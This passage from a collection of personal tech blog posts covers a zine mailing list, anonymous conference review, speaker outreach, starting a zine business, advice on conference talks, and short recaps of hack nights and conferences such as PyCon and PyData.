tweeting about how they loved this week’s email. \n\n You can  sign up here  if you want. \n\n how it works: a ConvertKit sequence \n\n The way I implemented it is with a ConvertKit sequence. Here’s an example of\nwhat the setup looks like: there’s a list of subject lines & when they’re\nscheduled to go out (like “1 week after the last email”), and then you can fill\nin each email’s content. I’ve found it pretty straightforward to use so far. \n\n \n \n \n\n marketing = building trust \n\n This list is sort of a marketing tool, but I’ve learned to think of marketing\n(at least for my business) as just building trust by helping people learn new\nthings. So instead of worrying about optimizing conversion rates or whatever\n(which has never helped me at all), I just try to send emails to the list that\nwill be helpful. \n\n With every comic I include a link to the zine that it’s from in case people\nwant to buy the zine, but I try to not be super in-your-face about it – if\nfolks want to buy my zines, that’s great, if they want to just enjoy the weekly\ncomics, that’s great too. \n\n that’s all! \n\n This idea of a mailing list where you send out your favourite work instead of\nyour latest work was really new to me, and I’m happy with how it’s gone so far! \n\n"},
{"url": "https://jvns.ca/blog/2014/06/06/should-my-conference-do-anonymous-review/", "title": "Should my conference do anonymous review?", "content": "\n      I recently wrote an post called\n Anonymous review is amazing ,\ntalking about our experience with anonymous review at\n !!Con  (it was excellent! I was surprised\nand delighted!). There was a discussion on the PyCon organizers list\ntoday about whether PyCon should do anonymous review, and I started\nthinking about this a little more carefully. \n\n I’m going to make a few assumptions up front: our goal as conference\norganizers is to have \n\n \n a process that is as unbiased as possible \n speakers who will be engaging \n who come from diverse backgrounds \n where some are new speakers, and some are more experienced \n \n\n Let’s talk about whether anonymous review will help us with these things! \n\n \n\n Is anonymous review less biased? \n\n Yes. \n\n Firstly, people  believe  that anonymous review is less biased. \n\n One of our !!Con’s speakers,\n Katherine Ye , told us: \n\n \n Thank you so much for [anonymizing everything]! It’s a relief to\nknow that I wasn’t picked for gender, race, age, or anything like\nthat. \n \n\n Kenneth Hoxworth  said of RailsConf’s\nanonymous review process: \n\n \n It gave me courage that I wasn’t going up against big names. \n \n\n It’s really important for people to have confidence in a conference’s\nreview process. Nobody wants to put time into a proposal if they’re\ngoing to be dismissed because of their gender or age or race, or just\nbecause they’re not famous enough. People also worry about not being\naccepted on their own merit. \n\n Anonymous review helps us build confidence, and that’s really\nvaluable. \n\n Anonymous review is also  actually  less biased.\n This study by Kathryn McKinley \nshows that, in peer-reviewed scientific articles, both men and women\nexpress systemic bias against women, and double-blind reviewing\nremoved that bias. (thanks to\n Lindsey Kuper  for the link!) \n\n \n They found nepotism and gender bias were significant factors in the\nevaluation process. To be judged as good as their male counter\nparts, female applicants had to be 2.5 times more productive. \n \n\n Will anonymous review help my conference’s diversity? \n\n Maybe.   EuroPython  has an anonymous\n  review process, and recently very few of their announced speakers\n  were women. This is because very few women applied to give talks.\n  You can’t accept talks that don’t exist! \n\n A more effective way to diversify your speaker pool is through active\noutreach. I don’t know of any evidence to show that anonymous review\nhelps you attract a more diverse range of speakers. (is there some? I\nwould love to know.) \n\n Will anonymous review help me get inexperienced speakers? \n\n Maybe . \n\n On one hand, we have \n\n \n It gave me courage that I wasn’t going up against big names. \n \n\n On the other hand,  Douglas Napoleone \npointed out: \n\n \n An anonymous system has an inherent bias towards very well written\n proposals. Those people whom have given the most talks are those\n whom are best at writing proposals which are best at getting\n through selection committees. It becomes a feedback loop which cuts\n out the very speakers we want most. Knowing that a person is a new\n speaker with a decent proposal is key when comparing them against a\n proposal by someone whom has given a talk at the last 8 python\n conferences. \n \n\n PyCon’s approach is to actively encourage new speakers to apply and\nwork with them to write better proposals, and that’s been successful. \n\n Florian Gilchner  wrote about eurucamp’s\nexperience with anonymous review\n here : \n\n \n We found that newcomers don’t write worse proposals than seasoned\nspeakers. Quite the contrary, we found that many proposals that are\nsubmitted to many conferences are unspecific and dull and would only\nfly by having a big name attached. Anonymous CFPs are very good at\nweeding out copy-pasta. We didn’t accept quite a few people that\nwould have been really shiny on the program. \n \n\n and \n\n \n Every year, we have at least one person we take huge bets on and get\nvery good talks out of that. Most of the time, it’s someone would\n[would lose out] in a direct and open battle. \n \n\n But will my speakers be good?! \n\n This is probably the scariest part. We did anonymous review for !!Con,\nand\n our speakers were very good .\nOur main hope was that if somebody wrote a proposal about an\ninteresting topic, then they could give an engaging 10-minute talk.\nThis worked. It’s relevant here that our talks were all lightning\ntalks. \n\n We also had an anonymizer, who did an amazing job reviewing videos and\ntelling us his impressions. This meant that we had to trust his\njudgement (which I do! and our speakers were great!), but having only\none person watching talks introduces bias. \n\n I’d be worried about doing anonymous review if I was organizing a\nconference where the talks were longer. (though it’s been done\nsuccessfully!) \n\n So should you do anonymous review? \n\n Anonymous review takes extra time. You should think about what\nbenefits you hope that it’ll bring, and what your alternatives are.\nThere’s some excellent discussion on the comments to\n a draft of this post .\nGo read the whole thing. \n\n Some other things you can spend time on: \n\n \n doing outreach to get more applications from under-represented\ncommunities \n giving new speakers feedback on their proposals and helping them do\na better job \n writing up a really good call for speakers (see\n JSConf EU’s! ) \n running brainstorming sessions to help people come up with ideas \n \n\n I would do it again for !!Con, since the response to it was super\npositive and the talks were good. I find the bias-reduction argument\npretty compelling. Nepotism and accepting your friends’ talks are\nreally hard to fight against. Judging speaker quality still worries\nme! \n"},
{"url": "https://jvns.ca/blog/2015/03/06/you-can-choose-who-submits-talks-to-your-conference/", "title": "You can choose who submits talks to your conference", "content": "\n      Sometimes I see conference organizers say “well, we didn’t have a choice about\nthe talk proposals we got!” or “we just picked the best ones!”. I think we all\nknow by now that that’s bullshit, but just in case – it’s bullshit! =D \n\n We have a choice about who submits talk proposals, and also about who submits\nthe  best  talk proposals. I watched somebody I know get talk proposal feedback\ntoday, and their proposal started out good and got dramatically better. Now\nit’s  great . \n\n If you ask someone specifically to consider speaking at your conference,\nthey’re WAY more likely to consider submitting a talk than if you don’t. If you\nthen actively work with some talk submitters to help them focus and improve the\ntalk they submit, their proposals will get better! And if you choose to focus\nyour energies to work with (for instance) non-white people more than white\npeople, then you’ll get more and better proposals from people who aren’t white. \n\n You can see this with PyCon! 30% of the talks at last year’s PyCon were women,\nbecause lots of people have done tons of individual outreach to encourage their\nfriends to give talks and spent lots of time working with them to write good\nproposals. As  Jessica McKellar says: \n\n \n Hello from your @PyCon Diversity Outreach Chair. % PyCon talks by women:\n(2011: 1%), (2012: 7%), (2013: 15%), (2014: 33%). Outreach works. \n \n\n This makes me really happy! It means that if I’m working on a conference (like\n !!Con ), then I know I can help get more diverse\nparticipation by sending emails to individual people who I’d like to hear from.\nTelling people that I like their work and that I’d like for them to talk about\nit is super fun! (and true!) \n\n \nIf there’s something you find exciting about programming and you often find\nyou’re part of an underrepresented group when you go to conferences, I’d  love \nit if you  submitted a talk to !!Con .\nDouble especially if you live in NYC!\n \n\n"},
{"url": "https://jvns.ca/blog/2018/08/14/i-started-a-company-/", "title": "I started a corporation!", "content": "\n     \n\n After I released  Bite Size Linux  in May, something surprising\nhappened – it sold WAY more copies than I expected! (as of today, 2600 copies!!!). If you bought\none, thank you! It was super encouraging and makes me want to produce a lot more fun zine ideas :).\nAnd 1300 of you have already bought  Bite Size Command Line ,\nwhich is similarly astonishing. \n\n The only downside of selling things is – making money is complicated! I need to track the income so\nI can pay income taxes, I need to pay sales tax on Canadian sales! Tracking expenses is really\nannoying! \n\n So I decided to start a corporation (just on the side, I still work at the same place ❤) to manage the\nlogistics. I’m pretty excited about this so I wanted to explain why. \n\n What’s involved in starting a company? \n\n I thought briefly about using  Stripe Atlas  (which is a cool way to easily start a US corporation) but I live in Canada so I decided to start a Canadian corporation. I hired a lawyer and an accountant to do all the paperwork. Now I have: \n\n \n A numbered Canadian corporation! \n GST and QST numbers for me use to pay sales tax! \n A corporate bank account and credit card! \n \n\n Even though I hired a lawyer / accountant to help me out, it ended up taking 8 weeks from start to\nfinish, mostly because I was travelling/busy. \n\n It’s easier to pay people! \n\n One of the most exciting things about having a company is that it’s easier to hire people to help me\nwith my zines! And I can use the company’s money to expense ALL KINDS OF THINGS. For example: \n\n \n I’m interested in doing collaborations with folks and paying them for their work. This makes that WAY easier – the fantastic Katie Sylor-Miller and I just announced a collaboration where we’re illustrating  oh shit, git! \n It simplifies hiring illustrators for my covers (and maybe I can get EVEN MORE things illustrated?!) \n I can hire an accountant to help with my taxes \n It makes it easier to maybe print & ship zines to people (because it simplifies things like potential kickstarter taxes), which folks have been asking me about FOREVER and I’d really like to do one day. \n I can hire an IP lawyer to get advice about intellectual property / copyright if I need it! \n I can more easily invest in equipment (like I’m thinking of buying a fancy colour laser printer or maybe even a machine to help me staple zines) \n \n\n It’s easier to keep track of money! \n\n Before, all my zine income was mixed in with my personal income. This was okay when there wasn’t\nthat much of it, but now that there’s more it’s really exciting to have it in a separate place. And\nI’m SO EXCITED about being able to use a corporate credit card to buy company-things. \n\n Adding a company rate for zines \n\n One other sort-of related thing I’m excited about is – for my last 2 zines, I’ve added a “corporate\nrate” which gives you permission to use a zine at work for $100. So far 47 companies have bought it\n(thanks ❤), which is really amazing. And one company bought the $500 version which is for companies\nover 1000 employees! \n\n It’s possible that I should increase those prices in the future, but it’s a start! \n\n some questions about running a zine business \n\n There are more aspects to selling zines that I’m interested in talking about in the future –\nreframing writing zines as a “small side business” instead of just a “fun thing” raises all kinds of\ninteresting questions like: \n\n \n will more or less people read my zines if I sell them than if they’re free? \n does selling zines make it harder to make weird niche zines because there’s an incentive to make\nthings that are more general-interest? \n does having a side business make it easier to do high quality work? \n do people value work more if it’s not free? \n right now I’m selling zines for $10, but $10 is a lot of money for many people (both in the US and outside the US). how do I keep them accessible? \n are there better ways to sell zines to companies? \n does giving away really good work for free normalize the idea that work “should” be given away for free? Does it undermine people who sell their work? \n \n\n All of the existing free zines that you can find at  https://wizardzines.com  will remain free, of course :).\nI’m not sure about newer zines. I’m doing some experiments! ( Bite Size Linux  and  Bite Size Command Line  are both not-free)\nMore on those questions in the future as I learn about them :) \n\n"},
{"url": "https://jvns.ca/blog/2016/06/06/make-better-conference-talks/", "title": "Ideas for making better conference talks & conferences", "content": "\n     \n\n The first programming conference I went to was DrupalCon. I met a lot of really great people and went to some of the open source sprints. It was awesome. It is an awesome conference. At the beginning, someone said to me “yeah, after you go once or twice you don’t really go to the talks any more – you won’t learn anything. Just hang out in the hallway!” \n\n Now, I love the hallway track, but as someone who cares about giving amazing talks, this statement makes me mad. It makes me even madder because sometimes it’s true! I do go to conferences sometimes and think “wow, I didn’t learn  anything  from that talk, though I thought I might from the abstract! What happened?” But I also go to tons of talks that I love and really change the way I think about programming and remember even years later. \n\n So!! How can you, as an individual conference speaker, give better talks? How can a conference organizer put together a conference with amazing talks that the attendees rave about and keep going to? \n\n I had so much to say about this topic that I had to write a table of contents. \n\n \n How do you make sure your audience understands you? \n How do you push your audience’s knowledge?  (or, “give hard talks”) \n Ideas for conference organizers \n \n\n What’s a good talk? \n\n To me, a good talk is one where I learn something new or come away with some change in perspective. The more I learn / the more the speaker makes me think differently about something, the better. So, to give a good talk, you need to say a new-to-your-audience thing in an understandable way. \n\n I don’t mind too much how many times you say “um” or how nice your slides are. \n\n ★ How do you make sure your audience understands you? ★ \n\n So you’re going to talk about web security, and you’re an expert, and you’re talking to an audience of beginners. How do you make sure what you say helps them, and doesn’t totally go over their head? Here are a few ideas! \n\n Think about your audience \n\n This is basically the only important thing about talks but I see a surprising number of people forget it! The only thing that matters is that your audience learns something that’s useful to them. For example, you’re probably reading this because you’re interested in getting better at giving talks, and you want to see if there’s something in here that will help you :). \n\n Kathy Sierra has several blog posts about this that I love, reminding you to ask  How will my talk help the attendee kick ass? . I also love  this post  and  this one too  and  her talk “Creating Passionate Users” . \n\n Some questions to ask about your audience: \n\n \n who are they (“web devs”) \n what is an important question you can answer for them? \n what would you like them to remember from your talk a year from now? This is probably only really going to be one or two things. \n \n\n Here’s are the resources for an AMAZING introductory security talk by Kelsey Gilmore Innis:  Security on a Shoestring . The question she poses in this talk is “You have critical data to secure. You don’t know much about security yet and have limited resources. Can you do right by your users?” Spoiler: yes! they passed a security audit! \n\n When she says she’s going to answer this question, I’m DYING to know how they did it. I’m extremely excited to watch  the video . \n\n So, answer questions that your audience would LOVE to know the answer to! Teach them something! Make them kick ass. \n\n Give a short talk \n\n 1 hour talks are incredibly hard to pull off. And you can easily give a 30 minute talk which only has 10-15 minutes of content in it. \n\n At my favorite conference,  !!Con , all the talks are 10 minutes. I’m biased because I helped organize it in the past, but I find the talk quality is  extremely  high. If you tell someone “hey, pick an extremely interesting topic and prepare 10 minutes of material on it”, they’re set up for success. You can’t put in irrelevant or boring stuff! There’s no time!!! This is a great hack to help new speakers (or anyone!) give great talks. \n\n I think a fun way to make an awesome talk is to ask yourself “what if I only had 10 minutes? What would I cut?” Then you have to think about what the most important parts of the talk are. \n\n Mark Dominus  reminded me of one common way 10-minute talks can fail, though – if you give a 10,000 foot level overview of the topic it can end up being really boring (“here is the history of np-completeness and who defined it and 38 different np complete problems oh no I’m out of time”). If you only have 10 minutes, it’s often way better to talk about one very specific interesting thing that you know about (for instance his hilarious + very instructive talk about how  planning Elmo’s World video releases is NP-complete ). \n\n Get some feedback on your talk \n\n Once my partner said to me “oh, I didn’t realize how much work you put into your talks – on stage you look like you’re just hanging out, but actually you worry about them for weeks beforehand” and I was like “YES EXACTLY”. \n\n I live in deathly fear of giving talks where my audience won’t learn what I want them to learn, so a few weeks beforehand I’m like OMG I NEED TO WRITE A DRAFT. OMG I NEED TO PRACTICE. Then I start harassing my partner to listen to me and tell me if I’m making sense. He is very patient. \n\n here is a recipe I use for getting feedback: \n\n \n write a talk (or part of a talk) \n tell it to a person who is part of my target audience. ask them what they learned, and what didn’t make sense to them \n if they can’t come up with anything they learned, I need to work harder. \n \n\n Sometimes my feedback-ees are nice and they are like “yeah it was cool but i didn’t learn anything” and I’m like NO IT IS NOT COOL IF YOU DO NOT LEARN ANYTHING. Then sometimes they tell me things they would like to have learned and things they didn’t feel they needed and it’s the best. \n\n One thing that’s great about this is that even if you get just  one person  to listen to your talk and tell you honestly what they thought, it can make a big difference! Often I do a practice version and it’s like “yeah julia that part made no sense to me.” Then I can make it better! \n\n Talk about something you didn’t build \n\n Talks about how interesting & useful your company or product is are hard. This is just because people won’t really care about your thing as much as you do most of the time. \n\n I’ve only seen a few really good examples of this. For instance, Paul Hildebrant gave a wonderful talk at PyCon last year about how Disney uses Python. It was 100% about how amazing Disney is and how cool it is to be at Disney, and it was also super interesting to see how they use Python. He had unusual examples, great visuals, and was a great presenter. A+ would listen to Disney propaganda again. \n\n I gave a talk about some open source software I built once and honestly? It wasn’t a great talk. I had to explain why the thing I built was useful, instead of being able to focus on what would help the audience. Talking about someone else’s work is kinda magical because instead of discussing the small subset of software I’ve built, I get to pick from ALL THE SOFTWARE IN THE UNIVERSE. Amazing! \n\n Also, when you talk about something you didn’t build, you’re automatically a lot more credible! For any piece of software I’m more likely to believe a glowing review from someone who is not its author. \n\n  ★ How do you push your audience’s knowledge? ★ \n\n This is where it gets super exciting. If you can make sure your talk is understandable, then this is a superpower you can use to EXPLAIN AWESOME STUFF TO YOUR AUDIENCE THAT THEY DIDN’T KNOW. \n\n Aim your talk at beginners \n\n One pretty straightforward way to push your audience’s knowledge is to find an audience of people who don’t know a lot about your topic yet. \n\n At conferences like PyCon, more than half of the attendees have never been to PyCon before. There are lots of talks which pick a subject a ton of people are interested in (how to build a web scraper! how to refactor Python code!  what’s HTTP ?) and give a great introduction to the topic without assuming a ton of background. A+ great contribution to the community. \n\n But, you can’t build a conference only out of beginner-level material! So next, we’re going to talk about building awesome non-beginner talks. \n\n Make your talk work for both experts and beginners \n\n Or, “Give a hard talk.” \n\n Okay, but once we stop being beginners, we don’t need to stop needing to learn! We need to write talks for people who already know a thing or two about your topic, but want to know much more. \n\n One of my favorite speakers is  aphyr , who gives great distributed systems talks. When I started watching his talks (like  Jepsen II: Linearizable Boogaloo ), I knew approximately nothing about distributed systems, and I definitely didn’t understand most of what he said. But I could start picking out ideas like “ok he cares a lot about network partitions” and “huh this CAP theorem seems really important”. And now I know more and I can read through  his analysis of Chronos  and understand most of it. \n\n It’s super important to be able to watch talks that are somewhat above your current level – they tell you what other concepts  exist , and what people with more expertise think is important. So, give talks aimed at a more advanced audience! Please! But where you can, give a shout out to the more novice members of your audience so that they can understand what kinds of things are ahead of them. \n\n I’d personally love to see conferences fish for more talks on advanced topics, to maintain the interest of people in their communities. \n\n Here’s a few other examples: \n\n Jessica Kerr spoke at Strange Loop 2 years ago on  Concurrency options on the JVM . I didn’t understand most of this talk the first time I watched it! But I  remembered  it, and when I came back 2 years later after understanding some of the basics of JVM concurrency, it helped me out quite a bit. \n\n This talk  Data Center Computers: Modern Challenges in CPU Design  is the 1-hour talk I love the most. He basically explains why he thinks server CPUs should be designed differently. You need to know about CPU caches and think about clock cycles. It’s really well presented and I loved watching it. \n\n Dan Luu is going to be giving  a talk at the next Strange Loop  answering “How do you query 10PB of data in a fraction of a second?”. This is a difficult question involving distributed systems and details about the hardware they use. Web-scale search is hard! But I think this talk could be accessible to a ton of people on different levels, even while talking about how to advance the state of the art. \n\n One thing I try to do when writing talks like this is to ask – “ok what if a freshman CS student was watching this talk? Would they understand anything”. And then usually  I find things that they could understand by just tweaking the presentation a bit, without explaining every single concept from the ground up. \n\n These talks I’m describing are dense talks that discuss hard material. I think sometimes conference organizers can shy away from these talks because, if executed badly, they can leave the whole audience lost. It’s riskier to try to explain how a huge distributed systems project works to a general audience than it is to, say, explain web scraping! But there’s a proportional reward! If you accept truly difficult talks by speakers who can make the content accessible to enough people, then I think you can end up with a conference that  people love going to every year . \n\n  ★ Ideas for conference organizers ★  \n\n So! You’re a conference organizer, and you’re looking for ideas for how to make the talks at your conference even more amazing?! I HAVE IDEAS. Some of them I’ve even tried! \n\n To build the best conferences, you need to, at your core, make sure that your presenters can explain stuff in a way that’s understandable. This is hard because your presenters are probably mostly nerds like me with limited public speaking experience. \n\n Some ideas for how to do this: \n\n Have a track of lightning talks  (5-10 minutes) for small cool ideas presenters have! Let presenters submit in advance and pick the most interesting-sounding ones! Many people can take a cool idea and 10 minutes and produce a great talk. \n\n Require experience . This is cool because you can tell if the person already knows how to talk in an engaging way and teach something interesting. But if you’re trying to accept talks from first-time speakers (who can do  great ), this doesn’t totally work. \n\n Pair up speakers  and give them the chance (optionally!) to give their talks to each other 2 weeks before the conference. I think some people  want  to give great talks, but maybe always don’t manage to find someone to practice on. I just made this idea up but I want to try it out soon. \n\n Write down fantastic talk ideas on your website . I could probably write abstracts for 15 talks I’d love to see. Probably you could too! But I do not have time to write 15 talks, obviously! So save your awesome potential speakers some time – tell them “hey we’d love a well-done talk explaining the Java garbage collection model and a few strategies for optimizing GC!” Maybe someone will come along and say “oh I know how to do that!!”. Or, better, “I have a better idea!” \n\n Email people and tell them what you want them to talk about . People are  terrible  at figuring out what cool stuff they know. Awful. I often tell someone “hey you know this thing that is awesome” and they’re like “wait really? doesn’t everyone know that? are you sure???” Tell them you want to know what they love about embedded programming, and maybe they’ll tell you about this wonderful  taking apart toys  series. \n\n Seek out people from other communities!!!  Running a Python conference? Why just talk about Python? Invite someone who writes 0 Python but does a lot of devops work and can teach you how how to operate your Python code! Someone who writes  embedded code for spacecraft  to bring in new ideas about what well-tested code  really  could mean! \n\n Borrow from academia . Academia isn’t known for always having the clearest presentations. The opposite, sometimes! But one thing I love about academic conferences is how focused they are on creating new things. And actually public speaking is a big part of their job! Maybe invite an academic and get them to talk about some research they love, that you think might be useful to your attendees! \n\n In general, I don’t see a lot of institutional support for speakers by conferences. Basically you submit a talk, they accept it if they think it sounds cool, you show up, and you give the talk. This is definitely because it’s a huge amount of work, and conference organizers have basically no extra time anyway. But I think some speakers  would  like a little more help, and I’d like to figure out ways that help that are not too much work. If you have more ideas (or more resources you love on how to give better talks!!), I’d love to hear them. \n\n  Thanks to Lindsey Kuper, Mark Dominus, Kamal Marhubi, Dan Luu, John Hergenroeder, Diego Berrocal, and Waldemar Quevado for commenting on this  \n\n"},
{"url": "https://jvns.ca/2013/01/27/all_girl_hack_night_2/", "title": "Montreal All-Girl Hack Night #2: now with cookies", "content": "\n      The second hack night was as awesome as the\nfirst one – I worked on making music with arduinos with\n Floh , and other people worked on a netflix\nautocompleter, a  keyboard music-making program in\nclojure , learning R, and some\nother things I didn’t catch since I was too busy coding. \n\n Turns out using a piezo speaker to make music is pretty easy! \n\n To encourage people to do more coding, we gave cookies to everyone who\ncoded. As a result, there was way more coding :) And there may be a\nworkshop next time! \n\n \n\n A few things: \n\n \n less people came this time, but I’m blaming that on the cold :) \n We made a wall of post its with programming project ideas. I’m not\ntotally sure if anyone actually got any programming ideas from it,\nbut it was a good conversation starter \n Someone came up to us after and offered to give an R workshop next\ntime! Yay! \n We gave cookies to anyone who was anywhere near a computer or looked\nlike they might be looking at code \n Some people still seemed to want more of a theme or direction for\nwhat to work on \n It continued to cost about $80. Yay! \n \n\n Next month: Google Montreal is hosting! \n"},
{"url": "https://jvns.ca/blog/2013/04/07/open-data-exchange-2013/", "title": "Open Data Exchange 2013", "content": "\n      I went to an amazing conference yesterday called  Open Data Exchange . \n\n There were so many interesting, thoughtful people who are really\ninterested in how to make the best use of open data to make things\nbetter. It was the best open data event I’ve ever been to.\nHere’s a few things that stood out to me. I’ve probably misrepresented\nwhat all of these people were saying in one way or another, but\nhopefully it is more or less accurate. \n\n One point that came up again and again is that it’s important to\n humanize  data and to  connect  programmers and designers and open data\nadvocates with citizens, business owners, and experts in their fields.\nOpen data apps are only useful if they’re solving problems that people\nare really having, and answering questions that people really need to\nknow the answers to.\n \n\n Lightning talks \n\n \n Diane Mercier  from the city talked about\nher work in educating people who work for the city on how to open up\ndata. She’s amazing and I’m so glad that there are people like her\nadvocating for open data at the city. \n Trina Chiasson  talked about how important it is to\n humanize  data, using the example of the piles of documents\ncollected during the Guatemalan civil war. This really made me think\nabout how to make sure that things I work on are actually useful to\npeople, and not just fun to work on. \n Anton Dubrau  demoed an app he made that\n overlays 1947 aerial photos with 2011 satellite views . His was\nthe only talk to get spontaneous applause. It’s definitely worth\nchecking out his  blog on maps and public transit . \n Alex Aylett  from  Eco Hack MTL \ntalked about urban sustainability projects. He’s interested in how open\ndata can apply to organizations like  Santropol Roulant  and\n Alternatives . He said that his main\ngoal with Eco Hack MTL was not to work on any specific project, but to\nconnect people from different areas and get them to talk to each\nother. Fantastic. There’s going to be a 5 à 7 in May and I’m\ndefinitely going to be there. \n Roberto Rocha ,\na data journalist at the Gazette, talked about how programmers can\ncollaborate with journalists. In particular, he said that journalists\n\n \n can help ask the right questions to put together a story \n have an audience :) \n know more about how to talk to politicians and organizations to\nget information, including how to make access to information\nrequests \n \n Edward Ocampo-Gooding  from  Open Data Ottawa \nintroduced the idea of  speed idea dating .\nI’m definitely going to try this when I next organize a hackathon-type\nevent. They also organized a meeting where programmers got to talk to\nthe local politicians who were providing the open data. So impressed\nwith what they’re doing and how open the local government in Ottawa is\nto these initiatives. \n \n\n Panels \n\n Pete Forde  mentioned this blog\npost by David Eaves, about how  open data saved Canada billions of dollars . \n\n People often talk about the potential open data has to uncover\ncorruption, and it’s really great to see concrete examples of that. \n\n Josée Plamondon  who works on\n ContratsNet  spoke about how she\ngets citizens, business owners, and experts involved. She said she had a\nreally valuable conversation about the issues with contracts in Montréal\nwith someone who owns a small construction company who explained what\nthey find frustrating. She’s found that it’s really difficult to engage\npeople online, and if you have meetings in real life you can learn a lot\nmore. Technology is less important than asking the right questions \n\n Corey Chivers  talked about work he’s\ndoing to find out how the results people are reporting in ecology papers\nare changing over the years.\n( slides ) \n\n One of my absolute favorite things was  Tracey Lauriault ’s\ntalk on “Geospatial Data Infrastructures” – how geospatial data is\nbeing organized, and how we can learn from that. A couple of notes I\ntook during her talk: \n\n \n Groups like the  Group on Earth Observations  have\nhuge amounts of data and have been thinking about how to manage it for\na long time. We can learn from them. \n Geographers have always had to share data, because mountains don’t\nrespect country boundaries. They’ve been doing this for decades. \n policy organizations don’t always look at data analysis, data analysis\npeople don’t always think about policy \n \n"},
{"url": "https://jvns.ca/blog/2014/01/22/cusec-equals-fun/", "title": "CUSEC = fun", "content": "\n      Last week I attended  CUSEC , an undergrad\nconference for software engineers. They invited me to speak which was\nsuper exciting, and there were a lot of great talks. I also got to\nmeet  Kelsey Gilmore-Innis  and it\nwas pretty great. \n\n Some of my favorite things:\n \n\n \n Josh Matthews  gave a great\nintroductory talk on how to contribute to Firefox. I liked how he\ngave some concrete examples of small patches. He also showed off\n http://whatcanidoformozilla.org/ ,\nwhich I hadn’t heard of before. You can see the\n slides  on his website, and\nthey have tons of detail. He really made the Mozilla community sound\nfriendly and welcoming and it was great. \n Kelsey Gilmore-Innis  talked about\nhow functional programming isn’t scary and the reasons she liked it.\nI liked how she pushed back against the notion that functional\nprograms are unreadable – she pointed out that people who write\nimperative programs spend a lot of time learning how to read for\nloops, and learning how to read  map  is similar. Food for thought\nfor sure. \n Avi Bryant  gave an\neasy-to-understand-for-me introduction to HyperLogLog and talked\nabout how we can often write better programs if we write them\nprobabilistically. Fun! \n \n\n Monica ,\n Kelsey , and a few other people put\ntogether something we called CUSECLadies. Basically we invited all the\nwomen students at CUSEC to meet up with us (women with programming\njobs and a few years’ experience on them) and had a big group\ndiscussion. We talked about salary negotiation, whether or not women\nstay in tech, how we all got into programming, people’s experiences in\nschool, whether we identify as feminists, advice for talking to\ncompanies at job fairs, the role of women-only groups, and a whole\nbunch of other things. \n\n It was totally unplanned, but I think/hope people got something out of\nit. \n\n I also gave a talk! It was called “You can be a kernel hacker!” and it\nwas 100% the most fun talk I have given so far. Here are\n links to the resources  I talked about. \n\n A whole bunch of delightful people came up to me after and told me\nthat they now feel like they know what a kernel is and how to get\nstarted with kernel programming! What a world =D \n\n My favorite new talk tactic (thanks to\n Monica ) is to gray out everything\nirrelevant when showing code samples. Here’s an example: \n\n Before: \n\n \n\n After: \n\n \n\n I found that this really helped with the cognitive load of code\nsamples and made showing kernel code much less intimidating. The\ntechnical term for this is “eraser eyes”. \n"},
{"url": "https://jvns.ca/blog/2013/09/12/pydata-boston-2013/", "title": "PyData Boston 2013", "content": "\n      I went to PyData Boston in July. The videos are just coming out now, so here are\na couple of things that I enjoyed. \n\n Travis Oliphant , the CEO of\nContinuum Analytics & author of NumPy gave the opening keynote. It was a great\noverview of what Continuum Analytics is up to (basically making wonderful\nsoftware like  Anaconda  and\n Wakari  and a million other amazing-looking things.). \n\n When talking about  Numba , he said “In my\nmind, there’s no reason to write C++ anymore” for scientific computing –\nyou can just use Numba and decorate your Python functions with  @autojit . \n\n Goodness. \n\n Lynn Cherny  gave a great talk about\ndetecting sex scenes in Fifty Shades of Grey. She talks about using Mechanical\nTurk to build a classifier. It’s super interesting and hilarious. I’m really\nhappy that I know that she exists now. I also found out that she maintains a\nmailing list for data visualization jobs.  Here’s the video .\n \n\n She said that she does all her data analysis in Python, and then writes\nfrontends in Javascript (using D3). \n\n Jeff Bezanson from the  Julia  project\ngave a short intro to Julia. What stood out to me the most was not how cool\nJulia looks (though it does!) but he just seemed like such a lovely guy. He\nsaid there’s lots of work to be done on Julia, and now I really want to\ncontribute. Apparently most of the standard library for Julia is written in\nJulia!  Also  Stefan Karpinski  is a Hacker School\nresident and <3 Hacker School.  Here’s the video of his talk . \n\n In the lightning talks,  Robert Speer \ndemoed a neat library for fixing Unicode called\n ftfy . \n\n I also met  Kat Chuang  who runs  PyLadies NYC  and is great. \n"},
{"url": "https://jvns.ca/blog/2014/04/13/pycon/", "title": "♥ PyCon", "content": "\n      PyCon 2014 happened! It was my first time at PyCon, I expected to have\na good time, and it was better than I expected. I spoke! People came\nup to me and said they enjoyed my talk! There were so many amazing\ntalks! I met so many people whose work I’d been following!  1 ⁄ 3  of the\ntalks were by women! It was  wonderful . \n\n A few talks that especially stood out to me, or that I missed and\n really  want to see. I didn’t see anything like all the talks, but I\nliked these. In no particular order: \n\n \n\n \nNot all of the videos are up yet, but I’ll come back to this later and\nput in video links when they are.\n \n\n \n Titus Brown  gave a wonderful talk\nabout his work in computationally intensive biology. I found this\nparticularly interesting because he offered roughly “I have harder\ndata problems that your tech job does! Come do a PhD with me and\nI’ll pay you a fraction as much.” This was oddly compelling. Very\nmuch worth watching.\n Notes from his talk ,\n [Video] \n Julie Pagano  gave\n advice about battling imposter syndrome .\nI liked that her advice was practical! We need better advice than\n“you shouldn’t have imposter syndrome!”, and this did well at that.\n [Video] \n Jessica McKellar ’s keynote on how we can help advance computer\nscience education was amazing. It was amazing because she gave so\nmany concrete suggestions and specific calls to action: there were\neasy things (for example: call your legislators and tell them CS\nshould count for AP math/science credit!) and larger commitments.\nShe challenged everyone to do just one thing in the upcoming year to\ntry to make CS education in high school better.\n [Video] \n Fernando Perez  spoke about the\nstate of Python for scientific and how scientists are using IPython\nto easily make their work reproducible. I’m so impressed with the\ncommunity he’s building around this software. The tools are so good\nand getting better so quickly.\n [Video] \n Naomi Ceder  spoke about\n being a trans woman in the Python community .\nI saw so many positive comments about her talk on Twitter\nafterwards. I’m really interested to see what she has to say, and\ndelighted that I work in a community where her perspective is\nvalued.\n [Video] \n Paul Tagliamonte ’s talk about\n compiling Lisp to Python bytecode \nwas the kind of excited “let’s see how far we can take this crazy\nidea!” talk that I really enjoy. Super enjoyable speaker.\n [Video] \n Julie Lavoie  talked about\n Analyzing Rap Lyrics with Python .\nI liked this because she clearly loves rap, and she gave some\nbackground on rap as an art form, including samples from different\nstyles. Also it was a super fun introduction to natural language\nprocessing.\n [Video] \n Tavish Armstrong  talked about one of\nhis favorite topics: how programmers can learn from software\nengineering research. His call to action: Try to measure something\nabout your software engineering practice! Show it to your friends!\nReproduce it! Give a talk at PyCon next year about it!\n [Video] \n Allison Kaptur  explained how\n import works in Python, from the ground up .\nI loved that she started with a naive version of import and kept\nincrementally improving it until we got to a version that 